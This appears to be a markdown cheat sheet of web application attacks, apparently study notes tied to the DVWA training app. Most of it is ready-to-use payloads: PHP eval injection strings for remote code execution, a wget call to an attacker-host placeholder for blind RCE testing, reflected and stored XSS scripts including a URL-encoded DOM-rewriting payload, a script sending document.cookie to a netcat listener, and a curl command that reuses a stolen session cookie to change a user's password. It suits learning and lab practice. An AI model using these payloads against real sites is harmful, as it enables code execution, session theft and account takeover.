<!-- # exploiting_web_application -->
# Server side EXploitation
## REmote code execution
  * Example of Code Evaluation Exploitation
  You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
  
          eval("\$$user = '$regdate');
    
  attacker
  
          x = 'y';phpinfo();//
          
 * Stored Remote Code Evaluation Explanation and Example
 An expected input could be like this:

             ?language=de
        
attacker
   
             de';phpinfo()//

### Testing blind RCE
 #### 1. use tcpdump to capture ICMP requests
 
        tcpdump -i eth0 icmp
      Example output
      
              16:17:46.354621 IP 10.79.97.62 > 216.58.200.14: ICMP echo request, id 33817, seq 1707, length 64
              16:17:46.399959 IP 216.58.200.14 > 10.79.97.62: ICMP echo reply, id 33817, seq 1707, length 64
  * With the following command, we can filter ICMP echo-reply, 
        
        tcpdump -i eth0 "icmp[0] == 0"  
  * To filter ICMP echo-requests, we can use this tcpdump command.

        tcpdump -i eth0 "icmp[0] == 8"
#### 2. Run python server and capture hit request
   then 
   
         wget http://atckerip:python2:serverport/file_in_attacker machine
      
# Client side Exploitation
## Cross site scripting (XSS)
## XSS(Reflected)
### Basic XSS

    <script>alert('Hello XSS')</script>
  * redirecting 
           
          <script>document.location = "http://google.com"</script>
    
  * Iframe injection (load arbitrary code in the browser)
  
         <iframe src="http://uwo.ca"></iframe>
 ### More Complex XSS
 * changing elements in the DOM --> It will change the 17th tag to point to evilsite.com
  
        <script>
        window.onload = function() {
          s=document.getElementsByTagName("a")[17];
          s.href="http://evilsite.com";
          s.text="http://evilsite.com";s.style.color="red";
           }
        </script>
    
   * url encoded aove script  
   
                %3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%2E%6F%6E%6C%6F%61%64=%66%75%6E%63%74%69%6F%6E%28%29%7B%73=%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%4  2%79%54%61%67%4E%61%6D%65%28%22%61%22%29%5B%31%37%5D%3B%73%2E%68%72%65%66=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%74%65%78%74=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%73%74%79%6C%65%2E%63%6F%6C%6F%72=%22%72%65%64%22%3B%7D%3C%2F%73%63%72%69%70%74%3E

### Stealing a cookie

       <script>new Image ().src="http://localhost:1234/"+document.cookie;</script>
   or
       
       <IMG src=1 onerror=alert(document.cookie)>
    
  * netcat listerner
       
        netcat -lvp 1234
  * using the stolen cookie to impesonate user ---> in DVWA changing the password of user

        curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
 
## XSS(Stored)
*  website allows users to submit comments on blog posts, which are displayed to other users. It executes when user visits that site
   
        <script>alert(document.cookie)</script>
        <IMG src=1 onerror=alert(document.cookie)>
        <scr<script>ipt>alert(document.cookie)</script>
    
 
